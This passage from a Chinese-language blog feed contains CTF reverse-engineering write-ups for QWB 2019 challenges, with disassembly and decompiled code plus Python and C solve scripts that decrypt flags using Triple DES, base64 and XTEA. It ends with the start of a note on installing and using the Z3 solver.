class="line">00401B3F  | 83C6 08                     | add esi, 8                                    |</span><br><span class="line">00401B42  | 3BF7                        | cmp esi, edi                                  | edi:&amp;&quot;D:\\CTF\\Games\\2019\\QWB\\task_JustRe5\\JustRe5\\JustRe.exe&quot;</span><br><span class="line">00401B44  | 0F8C 06FFFFFF               | jl justre.401A50                             |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后这一部分是对比, 而且对比的只有前4组, 后两组数是固定不变的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401B4A  | C74424 10 507CA9E6          | mov dword ptr ss:[esp+10], E6A97C50           |</span><br><span class="line">00401B52  | 33C0                        | xor eax, eax                                  |</span><br><span class="line">00401B54  | C74424 14 8709CEFA          | mov dword ptr ss:[esp+14], FACE0987           |</span><br><span class="line">00401B5C  | C74424 18 20D50DCF          | mov dword ptr ss:[esp+18], CF0DD520           |</span><br><span class="line">00401B64  | C74424 1C 90BB976C          | mov dword ptr ss:[esp+1C], 6C97BB90           |</span><br><span class="line">00401B6C  | C74424 20 9090F6B0          | mov dword ptr ss:[esp+20], B0F69090           |</span><br><span class="line">00401B74  | C74424 24 7BA6A4E8          | mov dword ptr ss:[esp+24], E8A4A67B           |</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00401B80  | 8A4C04 10                   | mov cl, byte ptr ss:[esp+eax+10]              |</span><br><span class="line">00401B84  | 3A8C04 38020000             | cmp cl, byte ptr ss:[esp+eax+238]             |</span><br><span class="line">00401B8B  | 75 1F                       | jne justre.401BAC                            |</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上面的分析, 猜测这是一个64位的分块加密算法, 查了一下发现是DES3</p><ul><li>```text<br>三重 DES 的加解密方式如下C=Ek3(Dk2(Ek1(P)))C=Ek3(Dk2(Ek1(P)))P=Dk1(Ek2(Dk3(C)))P=Dk1(Ek2(Dk3(C)))在选择密钥时, 可以有两种方法<ul><li>3 个不同的密钥, k1, k2, k3 互相独立, 一共 168 比特。</li><li>2 个不同的密钥, k1 与 k2 独立, k3=k1, 112 比特。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">最后直接通过pyCrypto模块导入DES3, 解出后16位, 脚本如下如下</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">key = &quot;AFSAFCEDYCXCXACNDFKDCQXC&quot;</span><br><span class="line">cipher = [0x50, 0x7C, 0xA9, 0xE6, 0x87, 0x09, 0xCE,          0xFA, 0x20, 0xD5, 0x0D, 0xCF, 0x90, 0xBB, 0x97, 0x6C]</span><br><span class="line">flag2 = &#x27;&#x27;.join(map(chr, cipher))</span><br><span class="line">des3 = DES3.new(key)</span><br><span class="line"></span><br><span class="line">print des3.decrypt(flag2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>最终脚本:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line">s = [<span class="number">0x55</span>, <span class="number">0x8B</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>]</span><br><span class="line"></span><br><span class="line">aa = []</span><br><span class="line"></span><br><span class="line">key = (s[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">0xFF</span>):</span><br><span class="line">    s1 = [<span class="number">0x08</span>, <span class="number">0x94</span>, <span class="number">0xB3</span>, <span class="number">0x7B</span>]</span><br><span class="line">    <span class="keyword">for</span> j in xrange(<span class="number">4</span>):</span><br><span class="line">        s1[j] += i</span><br><span class="line">    key2 = (s1[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s1[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s1[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s1[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0XFFFFFFF</span> &lt; (key ^ key2) &lt;= <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        aa.append(key ^ key2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        aa.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>]</span><br><span class="line"></span><br><span class="line">bb = []</span><br><span class="line"></span><br><span class="line">key = (s[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">0xFF</span>):</span><br><span class="line">    s1 = [<span class="number">0x98</span>, <span class="number">0xBD</span>, <span class="number">0x90</span>, <span class="number">0xEA</span>]</span><br><span class="line">    <span class="keyword">for</span> j in xrange(<span class="number">4</span>):</span><br><span class="line">        s1[j] += i</span><br><span class="line">    key2 = (s1[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s1[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s1[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s1[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0XFFFFFFF</span> &lt; (key ^ key2) &lt;= <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        bb.append(key ^ key2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bb.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in xrange(len(aa)):</span><br><span class="line">    <span class="keyword">if</span> aa[i] != <span class="number">0</span> <span class="keyword">and</span> bb[i] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> bb[i] - aa[i] == <span class="number">1</span>:</span><br><span class="line">            print hex(aa[i])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">s = [<span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x81</span>, <span class="number">0xEC</span>]</span><br><span class="line">s1 = [<span class="number">0x98</span>, <span class="number">0xBD</span>, <span class="number">0x90</span>, <span class="number">0xEA</span>]</span><br><span class="line">key = (s[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s[<span class="number">0</span>]</span><br><span class="line">key2 = (s1[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) + (s1[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + (s1[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + s1[<span class="number">0</span>]</span><br><span class="line">print hex((key ^ bb[i]) - key2)</span><br><span class="line"></span><br><span class="line">a = (key ^ bb[i]) - key2</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;AFSAFCEDYCXCXACNDFKDCQXC&quot;</span></span><br><span class="line">cipher = [<span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xA9</span>, <span class="number">0xE6</span>, <span class="number">0x87</span>, <span class="number">0x09</span>, <span class="number">0xCE</span>,          <span class="number">0xFA</span>, <span class="number">0x20</span>, <span class="number">0xD5</span>, <span class="number">0x0D</span>, <span class="number">0xCF</span>, <span class="number">0x90</span>, <span class="number">0xBB</span>, <span class="number">0x97</span>, <span class="number">0x6C</span>]</span><br><span class="line">flag2 = <span class="string">&#x27;&#x27;.join(map(chr, cipher))</span></span><br><span class="line"><span class="string">des3 = DES3.new(key)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print hex(aa[i])[2:10] + hex(a)[2:4] + des3.decrypt(flag2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>得flag{13242248150dcc509a6f75849b}</p><h2 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋_AD"></a>强网先锋_AD</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/QWB/JustRe/JustRe.rar%E5%BC%BA%E7%BD%91%E5%85%88%E5%B3%B0/qwb2019_misc.tar.gz">强网先锋_AD</a></p><p>这道题就是一道水题0.0</p><p>下载后拖进IDA里打开, 直接找到mian函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-150h]</span></span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">45</span>]; <span class="comment">// [rsp+80h] [rbp-D0h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+B0h] [rbp-A0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+B8h] [rbp-98h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+C0h] [rbp-90h]</span></span><br><span class="line">  __int16 v9; <span class="comment">// [rsp+C8h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+D0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=== Strong Network Pioneer === \n\n&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v10);</span><br><span class="line">  v6 = <span class="number">7953769703030221169LL</span>;</span><br><span class="line">  v7 = <span class="number">7954876941086586983LL</span>;</span><br><span class="line">  v8 = <span class="number">7956005061827062375LL</span>;</span><br><span class="line">  v9 = <span class="number">105</span>;</span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">0x5A</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x6D</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x78</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">104</span>;</span><br><span class="line">  key[<span class="number">4</span>] = <span class="number">90</span>;</span><br><span class="line">  key[<span class="number">5</span>] = <span class="number">51</span>;</span><br><span class="line">  key[<span class="number">6</span>] = <span class="number">116</span>;</span><br><span class="line">  key[<span class="number">7</span>] = <span class="number">116</span>;</span><br><span class="line">  key[<span class="number">8</span>] = <span class="number">89</span>;</span><br><span class="line">  key[<span class="number">9</span>] = <span class="number">87</span>;</span><br><span class="line">  key[<span class="number">10</span>] = <span class="number">90</span>;</span><br><span class="line">  key[<span class="number">11</span>] = <span class="number">104</span>;</span><br><span class="line">  key[<span class="number">12</span>] = <span class="number">97</span>;</span><br><span class="line">  key[<span class="number">13</span>] = <span class="number">51</span>;</span><br><span class="line">  key[<span class="number">14</span>] = <span class="number">86</span>;</span><br><span class="line">  key[<span class="number">15</span>] = <span class="number">104</span>;</span><br><span class="line">  key[<span class="number">16</span>] = <span class="number">97</span>;</span><br><span class="line">  key[<span class="number">17</span>] = <span class="number">87</span>;</span><br><span class="line">  key[<span class="number">18</span>] = <span class="number">120</span>;</span><br><span class="line">  key[<span class="number">19</span>] = <span class="number">104</span>;</span><br><span class="line">  key[<span class="number">20</span>] = <span class="number">97</span>;</span><br><span class="line">  key[<span class="number">21</span>] = <span class="number">88</span>;</span><br><span class="line">  key[<span class="number">22</span>] = <span class="number">70</span>;</span><br><span class="line">  key[<span class="number">23</span>] = <span class="number">112</span>;</span><br><span class="line">  key[<span class="number">24</span>] = <span class="number">89</span>;</span><br><span class="line">  key[<span class="number">25</span>] = <span class="number">87</span>;</span><br><span class="line">  key[<span class="number">26</span>] = <span class="number">53</span>;</span><br><span class="line">  key[<span class="number">27</span>] = <span class="number">107</span>;</span><br><span class="line">  key[<span class="number">28</span>] = <span class="number">89</span>;</span><br><span class="line">  key[<span class="number">29</span>] = <span class="number">87</span>;</span><br><span class="line">  key[<span class="number">30</span>] = <span class="number">57</span>;</span><br><span class="line">  key[<span class="number">31</span>] = <span class="number">105</span>;</span><br><span class="line">  key[<span class="number">32</span>] = <span class="number">102</span>;</span><br><span class="line">  key[<span class="number">33</span>] = <span class="number">81</span>;</span><br><span class="line">  key[<span class="number">34</span>] = <span class="number">61</span>;</span><br><span class="line">  key[<span class="number">35</span>] = <span class="number">61</span>;</span><br><span class="line">  v11 = &amp;v10;</span><br><span class="line">  sub_4005B7(&amp;v10, (__int64)v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != (<span class="keyword">unsigned</span> __int8)key[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you&#x27;re not\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;yes, you are!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最下面的循环是判断, 也就是说我们输入的v4要和key相等</p><p>进入sub_4005B7</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4005B7</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v11; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// [rsp+17h] [rbp-9h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">while</span> ( v16 &lt; v10 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v13;</span><br><span class="line">    v14 = v13 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v2) = base64[(<span class="keyword">const</span> <span class="keyword">unsigned</span> __int8)a1[v16] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v11 = <span class="number">16</span> * a1[v16] &amp; <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= v16 + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v14;</span><br><span class="line">      v5 = v14 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(a2 + v4) = base64[v11];</span><br><span class="line">      *(_BYTE *)(v5 + a2) = <span class="number">61</span>;</span><br><span class="line">      v6 = v5 + <span class="number">1</span>;</span><br><span class="line">      v13 = v5 + <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v6 + a2) = <span class="number">61</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = v14;</span><br><span class="line">    v15 = v14 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v3) = base64[((<span class="keyword">const</span> <span class="keyword">unsigned</span> __int8)a1[v16 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | v11];</span><br><span class="line">    v12 = <span class="number">4</span> * a1[v16 + <span class="number">1</span>] &amp; <span class="number">0x3C</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= v16 + <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(a2 + v15) = base64[v12];</span><br><span class="line">      v8 = v15 + <span class="number">1</span>;</span><br><span class="line">      v13 = v15 + <span class="number">2</span>;</span><br><span class="line">      *(_BYTE *)(v8 + a2) = <span class="number">61</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a2 + v15) = base64[((<span class="keyword">const</span> <span class="keyword">unsigned</span> __int8)a1[v16 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | v12];</span><br><span class="line">    v7 = v15 + <span class="number">1</span>;</span><br><span class="line">    v13 = v15 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v7) = base64[a1[v16 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v16 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v13 + a2) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看着很熟悉….直接就能找到base64加密table表</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/1558933633691.png" alt="1558933633691"></p><p>写个脚本跑一下, flag即出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">45</span>)]</span><br><span class="line"></span><br><span class="line">key[<span class="number">0</span>] = <span class="number">0x5A</span></span><br><span class="line">key[<span class="number">1</span>] = <span class="number">0x6D</span></span><br><span class="line">key[<span class="number">2</span>] = <span class="number">0x78</span></span><br><span class="line">key[<span class="number">3</span>] = <span class="number">104</span></span><br><span class="line">key[<span class="number">4</span>] = <span class="number">90</span></span><br><span class="line">key[<span class="number">5</span>] = <span class="number">51</span></span><br><span class="line">key[<span class="number">6</span>] = <span class="number">116</span></span><br><span class="line">key[<span class="number">7</span>] = <span class="number">116</span></span><br><span class="line">key[<span class="number">8</span>] = <span class="number">89</span></span><br><span class="line">key[<span class="number">9</span>] = <span class="number">87</span></span><br><span class="line">key[<span class="number">10</span>] = <span class="number">90</span></span><br><span class="line">key[<span class="number">11</span>] = <span class="number">104</span></span><br><span class="line">key[<span class="number">12</span>] = <span class="number">97</span></span><br><span class="line">key[<span class="number">13</span>] = <span class="number">51</span></span><br><span class="line">key[<span class="number">14</span>] = <span class="number">86</span></span><br><span class="line">key[<span class="number">15</span>] = <span class="number">104</span></span><br><span class="line">key[<span class="number">16</span>] = <span class="number">97</span></span><br><span class="line">key[<span class="number">17</span>] = <span class="number">87</span></span><br><span class="line">key[<span class="number">18</span>] = <span class="number">120</span></span><br><span class="line">key[<span class="number">19</span>] = <span class="number">104</span></span><br><span class="line">key[<span class="number">20</span>] = <span class="number">97</span></span><br><span class="line">key[<span class="number">21</span>] = <span class="number">88</span></span><br><span class="line">key[<span class="number">22</span>] = <span class="number">70</span></span><br><span class="line">key[<span class="number">23</span>] = <span class="number">112</span></span><br><span class="line">key[<span class="number">24</span>] = <span class="number">89</span></span><br><span class="line">key[<span class="number">25</span>] = <span class="number">87</span></span><br><span class="line">key[<span class="number">26</span>] = <span class="number">53</span></span><br><span class="line">key[<span class="number">27</span>] = <span class="number">107</span></span><br><span class="line">key[<span class="number">28</span>] = <span class="number">89</span></span><br><span class="line">key[<span class="number">29</span>] = <span class="number">87</span></span><br><span class="line">key[<span class="number">30</span>] = <span class="number">57</span></span><br><span class="line">key[<span class="number">31</span>] = <span class="number">105</span></span><br><span class="line">key[<span class="number">32</span>] = <span class="number">102</span></span><br><span class="line">key[<span class="number">33</span>] = <span class="number">81</span></span><br><span class="line">key[<span class="number">34</span>] = <span class="number">61</span></span><br><span class="line">key[<span class="number">35</span>] = <span class="number">61</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(key[i])</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{mafakuailaiqiandaob}</p><h2 id="webassembly"><a href="#webassembly" class="headerlink" title="webassembly"></a>webassembly</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/QWB/JustRe/JustRe.rarwebassembly/webassembly5.tar">webassembly</a></p><p>这是我第一次接触wasm, 记录一下0.0</p><p>题目下下来只有三个文件, 分别是<code>.js</code> , <code>.wasm</code>, <code>.html</code></p><p>wasm介绍就不在这里介绍了, 有兴趣可以到这里看看</p><p>wasm就是一堆二进制文件, 就很头秃。但可以用<a href="https://github.com/WebAssembly/wabt">wabt工具</a>转成<code>.c</code>和<code>.h</code>文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$./wasm2c webassembly.wasm -o webassembly.c</span><br></pre></td></tr></table></figure><p>不过还是看不懂, 代码行数贼恐怖18567行…………..后来Apeng大佬提供了一种优化方法:用gcc编译后在用ida反编译</p><p>将之前反编译出来的wasm.c, wasm.h, 以及wabt项目内的wasm-rt.h, wasm-rt-impl.c, wasm-rt-impl.h三个文件放到同一个文件夹。</p><p>直接gcc wasm.c会报错, 因为很多wasm的函数没有具体的实现。但是我们可以只编译不链接, 我们关心的只是程序本身的逻辑, 不需要真正编译出能运行的elf来。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gcc</span> -c wasm.c -o wasm.o</span><br></pre></td></tr></table></figure><p>得到的还未连接的elf文件wasm.o</p><p>现在就可以丢进ida来分析了, 比之前的wasm.c友好很多。</p><p>分析出来是, XTEA加密, 解密脚本(Apeng大佬太强了0.0)如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x9E3779B9</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v[<span class="number">10</span>] = &#123; <span class="number">2586051617L</span>, <span class="number">2764128737L</span>, <span class="number">1835204653</span>, <span class="number">2601945884L</span>, <span class="number">95579550</span>, <span class="number">993221996</span>, <span class="number">1624609160</span>, <span class="number">781843991</span>, <span class="number">879125044</span>, <span class="number">0x7D61</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">        decipher(<span class="number">32</span>, &amp;v[i], k);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span> *)v &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
            <tag> WASM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Z3</title>
      <link href="/note-tool-z3/"/>
      <url>/note-tool-z3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li><p>python2</p><p><a href="https://link.jianshu.com/?t=https://pypi.org/project/z3-solver/4.5.1.0/%23files">https://pypi.org/project/z3-solver/4.5.1.0/#files</a>(whl文件下载地址)</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install z3_solver-4.5.1.0-py2-none-manylinux1_x86_64.whl</span><br></pre></td></tr></table></figure></li><li><p>python3</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip3 install z3-solver</span><br></pre></td></tr></table></figure></li></ul><h2 id="整理解"><a href="#整理解" class="headerlink" title="整理解"></a>整理解</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a1 = IntVector(<span class="string">&#x27;x&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res += <span class="built_in">chr</span>(m[a1[i]].as_long())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>更加优雅的写法(python3.6以后支持<code>f-string</code>)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = s.model()</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    v = 